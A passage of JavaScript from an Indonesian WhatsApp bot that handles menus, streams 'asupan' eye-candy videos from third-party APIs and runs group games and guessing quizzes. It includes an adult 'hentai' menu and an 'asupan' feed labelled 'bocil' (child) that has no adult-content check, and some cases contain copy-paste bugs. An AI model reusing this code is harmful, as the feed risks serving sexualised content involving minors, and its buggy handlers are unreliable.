if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, mememenu(prefix), MessageType.text, {quoted: troli})
break
case 'asupanmenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, asupanmenu(prefix), MessageType.text, {quoted: troli})
break
case 'animemenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, animemenu(prefix), MessageType.text, {quoted: troli})
break
case 'hentaimenu':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
Ramdani.sendMessage(from, hentaimenu(prefix), MessageType.text, {quoted: troli})
break                                                                
//------------------< asupan menu >------------------  
case 'asupan1':
              if (!isRegist) return freply(mess.regist)
              if (isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
			Ramdani.updatePresence(from, Presence.composing) 
				freply(mess.wait)
				data = fs.readFileSync('./lib/asupan.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				Ramdani.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break        
case 'asupan2':
              if (!isRegist) return freply(mess.regist)
              if (isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
			Ramdani.updatePresence(from, Presence.composing) 
				freply(mess.wait)
				data = fs.readFileSync('./lib/asupan2.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				Ramdani.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break 
              case 'ukhty':
              if (!isRegist) return freply(mess.regist)              
              if (isBanned) return freply(mess.banned)              
              freply(mess.wait)
              const ukhty = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/ukhty?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}ukhty`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(ukhty, "videoMessage", { thumbnail: ukhty, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
              case 'santuy':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)              
              freply(mess.wait)
              const santuy = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/santuy?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}santuy`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(santuy, "videoMessage", { thumbnail: santuy, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
              case 'bocil':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)              
              freply(mess.wait)
              const bocil = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/bocil?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}bocil`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(bocil, "videoMessage", { thumbnail: bocil, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
              case 'hijaber':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)              
              freply(mess.wait)
              const hijaber = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/hijaber?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}hijaber`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(hijaber, "videoMessage", { thumbnail: hijaber, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
              case 'geayubi':              
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              const geayubi = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/geayubi?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(geayubi, "videoMessage", { thumbnail: geayubi, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
              case 'aura':              
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              const naura = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/aura?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}aura`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(naura, "videoMessage", { thumbnail: naura, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
              case 'bunga':
              if (!isRegist) return freply(mess.regist)
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)              
              freply(mess.wait)
              const bunga = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/bunga?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}bunga`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(bunga, "videoMessage", { thumbnail: bunga, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break              
              case 'ayu':              
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              const ayu = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/ayu?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}ayu`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(ayu, "videoMessage", { thumbnail: ayu, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break              
              case 'caca':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              const caca = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/caca?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(caca, "videoMessage", { thumbnail: caca, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break              
              case 'delvira':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              const delvira = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/delvira?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}delvira`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(delvira, "videoMessage", { thumbnail: delvira, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
              case 'alita':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              const alita = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/delvira?apikey=${ramdaniapi}`)
              buttons = [{buttonId: `${prefix}alita`,buttonText:{displayText: `➡️ NEXT`},type:1}]
              videoMsg = (await Ramdani.prepareMessageMedia(delvira, "videoMessage", { thumbnail: alita, })).videoMessage
              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
              contentText:`DONE`,buttons,headerType:5}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
              Ramdani.relayWAMessage(prep)
              break
//------------------< Game >------------------
        case 'limitgame': 
        case 'balance': 
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
               const balance = atm.checkATMuser(sender, _uang)
               if (isPremium) return freply(`Limit Game : Unlimited\nBalance : Rp.${balance}`)
               textImg(`Limit Game : ${cekGLimit(sender, glimit, glimit)}/${limit}\nBalance : Rp.${balance}`)
               break
         case 'gelud':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
               if (!isGroup) return freply(mess.only.group)
               if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return freply('Hanya bisa dengan 1 orang')
               if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
               if (args.length === 0) return freply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
               if (fs.existsSync(`./media/${from}.json`)) return freply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
					
               gelutSkuy = setGelud(`${from}`)
               gelutSkuy.status = false
               gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
               gelutSkuy.Y = args[0].replace("@", "");
               fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
               starGame = `👑 Memulai Game Baku Hantam 👊🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

               Ramdani.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
               gameAdd(sender, glimit)
               break
        case 'delsesigelud':
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
               if (!isGroup) return freply(mess.only.group)
               if (fs.existsSync('./media/' + from + '.json')) {
               fs.unlinkSync('./media/' + from + '.json')
               freply('Berhasil Menghapus Sesi Gelud')
               } else {
               freply('Tidak ada sesi yang berlangsung')
}
               break
        case 'delsesittt':
        case 'resetgame':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               if (!isGroup) return freply(mess.only.group)
               if (!isTTT) return freply('Tidak Ada Permainan Di Grub Ini')
               naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
               ky_ttt = naa 
               freply('Sukses Mereset Game')
               break
        case 'tictactoe':
        case 'ttt':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (!isGroup) return freply(mess.only.group)
              if (args.length < 1) return freply('Tag Lawan Anda! ')
              if (isTTT) return freply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
              if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return freply('Tag target Lawan!')
              ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
              player1 = sender
              player2 = ment[0]
              angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
              id = from
              gilir = player2
              ky_ttt.push({player1,player2,id,angka,gilir})
              Ramdani.sendMessage(from, 
`*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
              gameAdd(sender, glimit)
              break
       case 'family100':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (game.isfam(from, family100)) return freply(`Masih ada soal yang belum di selesaikan`)
              anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolhumanapi}`)
              freply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
              let anoh = anu.data.result.aswer
              let rgfds = []
              for (let i of anoh){
              let fefs = i.split('/') ? i.split('/')[0] : i
              let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
              let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
              rgfds.push(axsf.toLowerCase())
}
              game.addfam(from, rgfds, gamewaktu, family100)
              gameAdd(sender, glimit)
              break
       case 'tebakanime':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) return freply("YANG SELUMNYA AJA BELOM DI SELESAIIN")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebakchara?apikey=${lolhumanapi}`)
              get_result = get_result.result
              ini_image = get_result.image
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_image)
              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {
              tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
})
              await sleep(30000)
              if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("*Jawaban*: " + jawaban)
              delete tebakanime[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
}
              gameAdd(sender, glimit)
              break
       case 'tebaklagu':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return freply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${xteamapi}&id=4mFuArYRh3SO8jfffYLSER`)
              get_result = get_result.result
              ini_audio = get_result.preview
              jawaban = get_result.judul
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_audio)
              freply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s')
              Ramdani.sendMessage(from, ini_buffer, audio, {quoted: mek}).then(() => {
              tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
})
              await sleep(30000)
              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("*Jawaban*: " + jawaban)
              delete tebaklagu[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
}
              gameAdd(sender, glimit)
              break
       case 'tebaktebakan':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${xteamapi}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.soal
              Ramdani.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
})
              await sleep(30000)
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete tebaktebakan[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
}
              gameAdd(sender, glimit)
              break
       case 'kuismath':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (kuismath.hasOwnProperty(sender.split('@')[0])) return freply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/kuis/math`)
              ini_image = get_result.soal
              jawaban = get_result.jawaban
              ini_buffer = await getBuffer(ini_image)
              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s' }).then(() => {
              kuismath[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
})
              await sleep(50000)
              if (kuismath.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("*Jawaban*: " + jawaban)
              delete kuismath[sender.split('@')[0]]
              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
}
              gameAdd(sender, glimit)
              break
       case 'tebakgambar':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return freply("Selesein yg sebelumnya dulu atuh")
              get_result = await fetchJson(`http://zekais-api.herokuapp.com/tebakgambar`)
              ini_image = get_result.soal
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              ini_buffer = await getBuffer(ini_image)
              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :'+kisi_kisi+'\nWaktu : 30s' }).then(() => {
              tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
})
              await sleep(30000)
              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("*Jawaban*: " + jawaban)
              delete tebakgambar[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
}
              gameAdd(sender, glimit)
              break
       case 'siapaaku':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/siapaaku?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Ramdani.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
})
              await sleep(30000)
              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete tebaksiapaaku[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
}
              gameAdd(sender, glimit)
              break
       case 'tebakkata':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebakkata.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/kata?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              Ramdani.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
              tebakkata[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
})
              await sleep(30000)
              if (tebakkata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete tebakkata[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
}
              gameAdd(sender, glimit)
              break
       case 'tebaklirik':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/lirik?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Ramdani.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
})
              await sleep(30000)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete tebaklirik[sender.split('@')[0]]
              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
}
              gameAdd(sender, glimit)
              break
      case 'tebakjenaka':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/jenaka?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              Ramdani.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
})
              await sleep(30000)
              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete tebakjenaka[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
}
              gameAdd(sender, glimit)
              break
       case 'kimiakuis':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebakkimia.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/unsurkimia?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.lambang
              pertanyaan = get_result.nama
              Ramdani.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
              tebakkimia[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakkimia.json", JSON.stringify(tebakkimia))
})
              await sleep(30000)
              if (tebakkimia.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete tebakkimia[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakkimia.json", JSON.stringify(tebakkimia))
}
              gameAdd(sender, glimit)
              break
       case 'tebakbendera':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/bendera?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.name
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.flag
              Ramdani.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
})
              await sleep(30000)
              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete tebakbendera[sender.split('@')[0]]
              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
}
              gameAdd(sender, glimit)
              break
       case 'susunkata':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/susunkata?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              pertanyaan = get_result.pertanyaan
              Ramdani.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
              susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
})
              await sleep(30000)
              if (susunkata.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete susunkata[sender.split('@')[0]]
              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
}
              gameAdd(sender, glimit)
              break
       case 'asahotak':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/asahotak?apikey=${lolhumanapi}`)
              get_result = get_result.result
              jawaban = get_result.jawaban
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.pertanyaan
              Ramdani.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
              asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
})
              await sleep(30000)
              if (asahotak.hasOwnProperty(sender.split('@')[0])) {
              console.log(color("Jawaban: " + jawaban))
              freply("Jawaban: " + jawaban)
              delete asahotak[sender.split('@')[0]]
              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
}
              gameAdd(sender, glimit)
              break
       case 'caklontong':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
